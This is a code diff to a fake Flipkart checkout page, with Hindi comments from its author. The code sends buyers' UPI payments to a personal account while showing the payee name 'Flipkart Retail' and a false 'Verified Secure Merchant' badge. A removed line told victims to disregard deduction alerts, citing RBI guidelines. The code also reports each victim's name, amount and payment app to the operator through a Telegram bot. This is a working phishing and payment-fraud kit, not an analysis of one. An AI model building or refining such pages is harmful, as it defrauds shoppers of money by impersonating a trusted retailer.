@@ -315,26 +315,45 @@
         <span>Payment</span>
     </div>
 </div>
-        <div class="p-4">
-            <div class="bg-white p-4 rounded shadow-sm">
-                <label class="flex items-center justify-between">
-                    <div class="flex gap-4 items-center">
-                        <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
-                        <span class="font-bold">UPI (PhonePe / GPay)</span>
-                    </div>
-                    <input type="radio" checked>
-                </label>
+       <div class="p-4">
+    <p class="text-[13px] font-bold text-gray-500 mb-3 uppercase">Select Payment Method</p>
+    
+    <div class="space-y-2">
+        <label class="flex items-center justify-between bg-white p-4 rounded shadow-sm border border-gray-100 active:bg-gray-50">
+            <div class="flex gap-4 items-center">
+                <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
+                <span class="font-bold text-gray-700">PhonePe</span>
             </div>
-            <div class="mt-4 p-3 bg-blue-50 rounded-md border border-blue-100">
-    <div class="flex items-center gap-2 mb-1">
-        <i class="fa-solid fa-circle-check text-blue-600"></i>
-        <span class="text-[12px] font-bold text-blue-800">Verified Secure Merchant</span>
+            <input type="radio" name="payMethod" value="phonepe" checked class="w-5 h-5 accent-[#2874f0]">
+        </label>
+
+        <label class="flex items-center justify-between bg-white p-4 rounded shadow-sm border border-gray-100 active:bg-gray-50">
+            <div class="flex gap-4 items-center">
+                <img src="https://img.icons8.com/color/48/google-pay.png" class="w-6 h-6">
+                <span class="font-bold text-gray-700">Google Pay (GPay)</span>
+            </div>
+            <input type="radio" name="payMethod" value="gpay" class="w-5 h-5 accent-[#2874f0]">
+        </label>
+
+        <label class="flex items-center justify-between bg-white p-4 rounded shadow-sm border border-gray-100 active:bg-gray-50">
+            <div class="flex gap-4 items-center">
+                <img src="https://img.icons8.com/color/48/paytm.png" class="w-6 h-6">
+                <span class="font-bold text-gray-700">Paytm</span>
+            </div>
+            <input type="radio" name="payMethod" value="paytm" class="w-5 h-5 accent-[#2874f0]">
+        </label>
     </div>
-    <p class="text-[10px] text-gray-500">Security Note: As per RBI guidelines, you might see a standard deduction alert on your UPI app. Please proceed safely to confirm your order.</p>
-</div>
-            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
+
+    <div class="mt-4 p-3 bg-blue-50 rounded-md border border-blue-100">
+        <div class="flex items-center gap-2 mb-1">
+            <i class="fa-solid fa-circle-check text-blue-600"></i>
+            <span class="text-[12px] font-bold text-blue-800">Verified Secure Merchant</span>
         </div>
+        <p class="text-[10px] text-gray-500">Note: Select your preferred app and click 'Place Order' to complete the payment.</p>
     </div>
+
+    <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold text-sm tracking-wide">Place Order & Pay</button>
+</div>
 
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
@@ -549,21 +568,34 @@ init = function() {
             }
         }
 
-     async function confirmPay() {
-    // 1. Apni Real Business ID yahan quotation marks ke andar dalein
-    const businessUpi = "ravikantb114-2@okaxis"; // <--- YAHAN CHANGE KAREIN
-    
-    // Baaki code bilkul same rahega
-    const txnId = "FK" + Math.floor(Math.random() * 999999);
-    
-    // Yahan pn (Name) ko 'Flipkart Retail' rakha hai taki professional lage
-    const upiLink = `upi://pay?pa=${businessUpi}&pn=Flipkart%20Retail&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02`;
+    async function confirmPay() {
+    const businessUpi = "ravikantb114-2@okaxis"; 
+    const amount = sel.price;
+    const txnId = "FK" + Math.floor(Math.random() * 1000000);
+    const name = "Flipkart%20Retail";
 
-    // Telegram report
-    const msg = `🚀 *Business Payment Intent*\n👤: ${document.getElementById('uName').value}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    // Pata lagao user ne kaunsa app select kiya hai
+    const selectedApp = document.querySelector('input[name="payMethod"]:checked').value;
 
-    window.location.href = upiLink;
+    let upiUrl = `upi://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+
+    // App ke hisaab se link change karein
+    if (selectedApp === "phonepe") {
+        window.location.href = `phonepe://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+    } 
+    else if (selectedApp === "gpay") {
+        window.location.href = `tez://upi/pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+    } 
+    else if (selectedApp === "paytm") {
+        window.location.href = `paytmmp://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+    } 
+    else {
+        window.location.href = upiUrl; // Default generic UPI
+    }
+
+    // Telegram Notification
+    const msg = `🔔 *New Order Attempt*\n👤 Name: ${document.getElementById('uName').value}\n💰 Amount: ₹${amount}\n📱 App: ${selectedApp}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 }
 // Ye line hamesha last mein rehni chahiye
 init();
